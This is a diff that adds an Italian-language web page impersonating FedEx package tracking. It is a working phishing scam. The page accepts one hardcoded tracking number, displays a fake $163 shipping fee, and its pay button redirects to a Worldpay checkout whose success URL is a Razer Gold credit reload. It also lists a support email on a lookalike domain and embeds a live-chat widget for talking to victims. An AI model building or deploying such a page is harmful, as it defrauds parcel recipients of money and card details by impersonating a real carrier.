@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FedEx Tracking</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+   
+
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        .progress-bar {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .progress-bar div {
+            flex: 1;
+            text-align: center;
+            position: relative;
+        }
+
+        .progress-bar div:before {
+            content: '';
+            display: block;
+            width: 100%;
+            height: 5px;
+            background: #ccc;
+            position: absolute;
+            top: 50%;
+            left: -50%;
+            z-index: -1;
+            transform: translateY(-50%);
+        }
+
+        .progress-bar div:first-child:before {
+            content: none;
+        }
+
+        .progress-bar div.completed:before {
+            background: #4caf50;
+        }
+
+        .progress-bar i {
+            font-size: 24px;
+            color: #ccc;
+        }
+
+        .progress-bar div.completed i {
+            color: #4caf50;
+        }
+
+        .progress-bar div.current i {
+            color: #ff9800;
+        }
+
+        .progress-bar div span {
+            display: block;
+            margin-top: 8px;
+            font-size: 14px;
+        }
+
+        .customs-info {
+            background: #fff3cd;
+            border: 1px solid #ffeeba;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+            color: #856404;
+        }
+
+        .customs-info button {
+            background: #007bff;
+            color: #fff;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .customs-info button:hover {
+            background: #0056b3;
+        }
+
+        .payment-methods-section {
+            margin: 20px 0;
+            background-color: #f9f9f9;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .payment-methods-section h3 {
+            font-size: 24px;
+            margin-top: 0;
+        }
+        .payment-methods-section ul {
+            list-style: disc;
+            margin-left: 20px;
+        }
+        .payment-methods-section ul li {
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        .payment-methods-section a {
+            color: #4d148c;
+            text-decoration: none;
+        }
+        .payment-methods-section a:hover {
+            text-decoration: underline;
+        }
+
+
+        header {
+    background-color: #4d148c;
+    color: white;
+    padding: 15px;
+    position: sticky;
+    top: 0;
+    z-index: 1000;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+}
+
+header img {
+    max-width: 120px;
+}
+
+.nav-links {
+    display: flex;
+    gap: 15px;
+}
+
+.nav-links .menu {
+    display: flex;
+    gap: 15px;
+}
+
+.nav-links a {
+    color: white;
+    text-decoration: none;
+    font-size: 16px;
+    transition: color 0.3s;
+}
+
+.nav-links a:hover {
+    color: white;
+}
+
+/* قائمة منسدلة تظهر في الجوال */
+.nav-links .dropdown {
+    display: none;
+}
+
+@media (max-width: 768px) {
+    .nav-links .menu {
+        display: none; /* إخفاء القائمة العادية */
+    }
+
+    .nav-links .dropdown {
+        display: block; /* إظهار القائمة المنسدلة */
+    }
+
+    .nav-links select {
+        background-color: #4d148c;
+        color: white;
+        padding: 10px;
+        font-size: 16px;
+        border: none;
+        border-radius: 5px;
+    }
+}
+
+        .banner {
+            background: url('https://www.fedex.com/content/dam/fedex/eu-europe/images/EU-homepage-hero-1200x450.png') no-repeat center center/cover;
+            padding: 60px 20px;
+            text-align: center;
+            color: white;
+        }
+        .banner h2 {
+            font-size: 36px;
+            margin: 0;
+            font-weight: bold;
+        }
+        .container {
+            padding: 20px;
+            max-width: 1200px;
+            margin: auto;
+        }
+        .tracking-form {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .tracking-form p {
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+        .tracking-form input {
+            padding: 10px;
+            width: 300px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-right: 10px;
+        }
+        .tracking-form button {
+            margin-top: 16px;
+            padding: 12px 32px;
+            background-color: #ff6200;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .tracking-form button:hover {
+            background-color: #e05b00;
+        }
+        .shipment-details {
+            margin: 20px 0;
+            background-color: #f9f9f9;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .accordionContainer {
+            margin: 30px 0;
+        }
+        .accordion {
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            margin-bottom: 10px;
+            background-color: #f9f9f9;
+        }
+        .result__row {
+            padding: 15px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        .result__row:hover {
+            background-color: #eee;
+        }
+        .result__content {
+            padding: 15px;
+            display: none;
+            border-top: 1px solid #ddd;
+        }
+        .topics-section {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+        }
+        .topics-section .topic {
+            flex: 1 1 calc(33.333% - 20px);
+            background-color: #f9f9f9;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 15px;
+        }
+        .topics-section .topic h3 {
+            margin-top: 0;
+            font-size: 18px;
+        }
+        .topics-section .topic ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+        .topics-section .topic ul li {
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+        .topics-section .topic ul li a {
+            color: #4d148c;
+            text-decoration: none;
+        }
+        .topics-section .topic ul li a:hover {
+            text-decoration: underline;
+        }
+        .payment-methods {
+            margin-top: 20px;
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+        .payment-methods img {
+            width: 45px;
+        }
+
+        .footer-links {
+            margin-top: 15px;
+            font-size: 14px;
+            text-align: center;
+        }
+        .footer-links a {
+            color: white;
+            text-decoration: none;
+            margin: 0 5px;
+            transition: color 0.3s;
+        }
+        .footer-links a:hover {
+            color: #ff6200;
+        }
+
+        .gdpr-modal {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #4d148c;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 5px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 1000;
+            font-size: 14px;
+            width: fit-content;
+        }
+        .gdpr-modal button {
+            background-color: #ff6200;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 5px;
+            margin-left: 15px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .gdpr-modal button:hover {
+            background-color: #e05b00;
+        }
+
+        footer {
+            background-color: #4d148c;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            margin-top: 30px;
+        }
+        footer .social-icons {
+            margin-top: 10px;
+        }
+        footer .social-icons a {
+            margin: 0 10px;
+            color: white;
+            text-decoration: none;
+        }
+        footer .social-icons a img {
+            width: 30px;
+        }
+    </style>
+</head>
+
+<body>
+<header>
+    <img src="https://www.fedex.com/content/dam/fedex-com/logos/logo.png" alt="Logo">
+          <!-- Start of LiveChat (www.livechat.com) code -->
+<script>
+    window.__lc = window.__lc || {};
+    window.__lc.license = 18938658;
+    window.__lc.integration_name = "manual_onboarding";
+    window.__lc.product_name = "livechat";
+    ;(function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))
+</script>
+<noscript><a href="https://www.livechat.com/chat-with/18938658/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
+<!-- End of LiveChat code -->
+
+
+    <nav class="nav-links">
+        <div class="menu">
+            <a href="#">Spedizioni</a>
+            <a href="#">Supporto</a>
+            <a href="#">Account</a>
+            <a href="en.php">English</a>
+            
+        </div>
+        <div class="dropdown">
+            <select onchange="window.location.href=this.value;">
+                <option value="#">Spedizioni</option>
+                <option value="#">Supporto</option>
+                <option value="#">Account</option>
+                <option value="en.php">English</option>
+                
+            </select>
+        </div>
+    </nav>
+</header>
+
+
+    <div class="banner">
+        <h2>Traccia la tua spedizione</h2>
+    </div>
+
+    <div class="container">
+        <div class="tracking-form">
+            <p>Hai bisogno dello stato della tua spedizione o di una prova di consegna? Inserisci il numero di tracciamento qui sotto.</p>
+            <input type="text" id="trackingNumber" placeholder="Inserisci il numero di tracciamento">
+            <button onclick="trackShipment()">Traccia</button>
+        </div>
+
+        <div class="shipment-details" id="shipmentDetails" style="display: none;">
+    <h3>Informazioni sulla spedizione</h3>
+    <p><strong>Numero di tracciamento:</strong> 549012345678</p>
+    <p><strong>Riferimento cliente:</strong> 7</p>
+    <p><strong>Informazioni sulla spedizione:</strong> 2 articoli</p>
+    <p><strong>Consegna a:</strong> Aosta, Italy</p>
+    <p><strong>Dettagli della Spedizione:</strong>: Elettronica</p>
+    <p><strong>Consegna stimata:</strong> 18 dicembre 2024 prima delle 18:00</p>
+    <br>
+    
+<h1>Tracciamento Spedizione</h1>
+
+<div class="progress-bar">
+    <div class="completed">
+        <i class="fas fa-box"></i>
+        <span>Spedizione Pronta</span>
+    </div>
+    <div class="completed">
+        <i class="fas fa-truck"></i>
+        <span>In Transito</span>
+    </div>
+    <div class="current">
+        <i class="fas fa-warehouse"></i>
+        <span>Spese di Spedizione
+
+</span>
+    </div>
+    <div>
+        <i class="fas fa-check-circle"></i>
+        <span>Consegnato</span>
+    </div>
+</div>
+
+<div class="customs-info">
+    <p><strong>Nota:</strong>La tua spedizione è pronta per la consegna. Si prega di pagare le spese di spedizione di <strong>$163</strong> per procedere. Puoi effettuare il pagamento direttamente per ricevere la tua spedizione.
+
+
+
+    </p>
+    <button onclick="payCustomsFees()">Paga le Spese</button>
+</div>
+
+</div>
+
+        <div class="payment-methods-section">
+            <h3>Metodi di pagamento e servizi di fatturazione</h3>
+            <p>Presso la nostra azienda, ci impegniamo a offrire soluzioni di pagamento semplici e sicure per garantire la tua comodità e la rapida conclusione delle transazioni. Puoi scegliere il metodo di pagamento che preferisci tra le opzioni qui sotto:</p>
+            <h4>Metodi di pagamento disponibili:</h4>
+            <ul>
+                <li><strong>Carte bancarie</strong><br>Accettiamo pagamenti con tutte le principali carte bancarie, tra cui:</li>
+                <ul>
+                    <li>Visa</li>
+                    <li>MasterCard</li>
+                    <li>American Express</li>
+                </ul>
+                <li><em>Nota:</em> Per garantire la sicurezza delle tue informazioni personali, ti preghiamo di non condividere i dettagli della tua carta via email o altri mezzi scritti.</li>
+            </ul>
+            <h4>Supporto tecnico per assistenza rapida:</h4>
+            <p>Se riscontri problemi durante il processo di pagamento, puoi contattarci tramite i seguenti metodi:</p>
+            <ul>
+                <b><li>Email: <a href="mailto:support@fedex-it.spedizione.online"> support@fedex-it.spedizione.online</a></li></b>
+                <b><li>Chat dal vivo: Clicca sull'icona di supporto tecnico in fondo alla schermata per metterti in contatto con il nostro team dedicato.</li></b>
+            </ul>
+            <h4>Servizi di fatturazione:</h4>
+            <p>Gestisci le tue fatture elettronicamente:</p>
+            <ul>
+                <li>Visualizza le fatture in sospeso e paga direttamente.</li>
+                <li>Traccia i pagamenti precedenti.</li>
+                <li>Imposta promemoria automatici per le scadenze.</li>
+            </ul>
+            <p><strong>Ricevuta elettronica:</strong><br>Al termine del pagamento, riceverai una ricevuta elettronica all'indirizzo email registrato.</p>
+            <p><strong>Per ulteriori informazioni:</strong><br>Non esitare a contattare il nostro team di supporto clienti tramite email o chat dal vivo. Siamo qui per garantirti la migliore esperienza con noi.</p>
+        </div>
+
+
+        <div class="topics-section">
+            <div class="topic">
+                <h3>Argomenti popolari</h3>
+                <ul>
+                    <li><a href="#">Cosa significa lo stato 'Eccezione'?</a></li>
+                    <li><a href="#">Dove si trova il mio pacco?</a></li>
+                    <li><a href="#">Come posso tracciare il mio pacco senza un numero di tracciamento?</a></li>
+                    <li><a href="#">Vedi tutti</a></li>
+                </ul>
+            </div>
+            <div class="topic">
+                <h3>Dazi e imposte</h3>
+                <ul>
+                    <li><a href="#">Come posso pagare i dazi e le imposte?</a></li>
+                    <li><a href="#">Come vengono calcolati i dazi?</a></li>
+                    <li><a href="#">Se la spedizione è un regalo, devo pagare i dazi e le imposte?</a></li>
+                    <li><a href="#">Vedi tutti</a></li>
+                </ul>
+            </div>
+            <div class="topic">
+                <h3>Dogana</h3>
+                <ul>
+                    <li><a href="#">Perché il mio pacco è bloccato in dogana?</a></li>
+                    <li><a href="#">Come posso generare un codice MID per l'importazione negli Stati Uniti?</a></li>
+                    <li><a href="#">Cos'è un codice armonizzato o HS?</a></li>
+                    <li><a href="#">Vedi tutti</a></li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="accordionContainer">
+            <div class="accordion">
+                <div class="result__row" onclick="toggleAccordion(this)">
+                    <span>Perché il mio pacco non appare quando digito il numero di spedizione?</span>
+                </div>
+                <div class="result__content">
+                    <p>Potrebbero volerci fino a un'ora affinché la spedizione appaia nel nostro sistema. Attendi e riprova a tracciare. Le spedizioni rimangono nel nostro sistema per circa 90 giorni.</p>
+                </div>
+            </div>
+            <div class="accordion">
+                <div class="result__row" onclick="toggleAccordion(this)">
+                    <span>Perché il mio numero di spedizione mostra spedizioni che non sono le mie?</span>
+                </div>
+                <div class="result__content">
+                    <p>Gestiamo oltre due milioni di spedizioni al mese. Questo significa che i numeri di tracciamento a otto cifre vengono riutilizzati ogni tre o quattro settimane. Non preoccuparti: tutte le informazioni personali sono nascoste.</p>
+                </div>
+            </div>
+            <div class="accordion">
+                <div class="result__row" onclick="toggleAccordion(this)">
+                    <span>Track & Trace mi dice che ho perso la consegna. Posso riprogrammarla?</span>
+                </div>
+                <div class="result__content">
+                    <p>Certo. Se il corriere ha lasciato un biglietto "ti abbiamo cercato", puoi usarlo per riprogrammare la consegna. Nessun biglietto? Basta <a href="/express/en_us/site/contact.html">contattarci</a>. Avrai bisogno del numero di spedizione e dell'indirizzo di consegna. Nota: la riconsegna è disponibile solo dal lunedì al venerdì.</p>
+                </div>
+            </div>
+            <div class="accordion">
+                <div class="result__row" onclick="toggleAccordion(this)">
+                    <span>Ho appena tracciato il mio pacco e c'è un problema. Cosa faccio?</span>
+                </div>
+                <div class="result__content">
+                    <p>Non preoccuparti, ti contatteremo se c'è qualcosa che devi fare.</p>
+                </div>
+            </div>
+            <div class="accordion">
+                <div class="result__row" onclick="toggleAccordion(this)">
+                    <span>Come posso ottenere la prova di consegna (PoD) per la mia spedizione consegnata?</span>
+                </div>
+                <div class="result__content">
+                    <p>Puoi ottenere una copia dell'immagine della firma PoD da tutti i nostri strumenti di spedizione, come FedEX.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="payment-methods">
+        <img src="https://i1.plug.it/mail/carrello/2020/libero/img/visa.png" alt="Visa">
+        <img src="https://i1.plug.it/mail/carrello/2020/libero/img/mastercard.png" alt="MasterCard">
+        <img src="https://i1.plug.it/mail/carrello/2020/libero/img/americanexpress.png" alt="Amex">
+    </div>
+
+    <div class="gdpr-modal" id="gdprModal">
+        <p>Questo sito web rispetta le normative GDPR. Leggi la nostra <a href="#" style="color: #ff6200;">Politica sulla privacy</a>.</p>
+        <button onclick="closeGDPRModal()">Accetta</button>
+    </div>
+
+    <footer>
+        <p>&copy; FedEx 1995-2024. Tutti i diritti riservati.</p>
+        <div class="social-icons">
+            <a href="https://www.facebook.com" target="_blank">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
+            </a>
+            <a href="https://www.instagram.com" target="_blank">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
+            </a>
+        </div>
+        <div class="footer-links">
+            <a href="#">Termini di utilizzo</a> | 
+            <a href="#">Politica sulla privacy</a> |
+            <a href="#">Accessibilità</a> |
+            <a href="#">Politica sui cookie</a>
+        </div>
+    </footer>
+
+    <script>
+    function trackShipment() {
+    const trackingNumber = document.getElementById('trackingNumber').value.trim();
+    const validTrackingNumbers = ["549012345678", "549012345678"]; // Puoi aggiungere altri numeri qui se vuoi
+    
+    // Verifica se il numero inserito è valido
+    if (validTrackingNumbers.includes(trackingNumber)) {
+        // Mostra i dettagli della spedizione se il numero è corretto
+        document.getElementById('shipmentDetails').style.display = 'block';
+    } else {
+        // Nasconde i dettagli della spedizione e mostra un messaggio di errore se il numero non è corretto
+        document.getElementById('shipmentDetails').style.display = 'none';
+        alert("Numero di tracciamento non valido.");
+    }
+}
+
+    </script>
+
+
+
+
+
+
+
+<script>
+    // دالة لتتبع الشحنة
+    function trackShipment() {
+        const trackingNumber = document.getElementById('trackingNumber').value.trim();
+        const validTrackingNumbers = ["549012345678", "549012345679"]; // أرقام التتبع الصحيحة
+
+        if (validTrackingNumbers.includes(trackingNumber)) {
+            document.getElementById('shipmentDetails').style.display = 'block'; // عرض التفاصيل
+        } else {
+            document.getElementById('shipmentDetails').style.display = 'none'; // إخفاء التفاصيل
+            alert("Il numero di tracciamento non è valido.");
+        }
+    }
+
+    // دالة لفتح وإغلاق محتوى الـ accordion
+    function toggleAccordion(element) {
+        const content = element.nextElementSibling;
+        if (content.style.display === "none" || content.style.display === "") {
+            content.style.display = "block";
+        } else {
+            content.style.display = "none";
+        }
+    }
+
+    // إغلاق الـ GDPR Modal
+    function closeGDPRModal() {
+        document.getElementById('gdprModal').style.display = 'none';
+    }
+
+    // إضافة Event Listener عند النقر على زر "Traccia"
+    document.querySelector('button').addEventListener('click', trackShipment);
+</script>
+
+<script>
+    function payCustomsFees() {
+        window.location.href = "https://payments.worldpay.com/app/hpp/integration/wpg/corporate?OrderKey=RAZERDCAPUSD%5E012DI5545QT1C1096868B&Ticket=00173477179733302aW_ICKvcfa0iM6M6L9yz7QoB6i85NxntAovFSo&source=https%3A%2F%2Fsecure.worldpay.com%2Fsc6&successURL=https%3a%2f%2fgold.razer.com%2fgold%2freload%2f012DI5545QT1C1096868B&cancelURL=https%3a%2f%2fpaychn.gold.razer.com%2fworldpay%2freturn%2fcancel%2fc3lZRit5Y3NvVDNkSnhNWU1nd1dBYnZnb0wrZGtTOXpBTXhDS1ZMVktWbGt6ZzgvN0RCL0pXazBTSk1ydTFHMFlocUJ2eElqQjNzUVZUaDBCaVRYWithYlRCR1l3bmlwdXNJL3o3TndqcTlEY2E5NjVLZVRpemNmUlM3Z2VRSjc&language=it";
+    }
+</script>
+
+</body>
+
+</html>
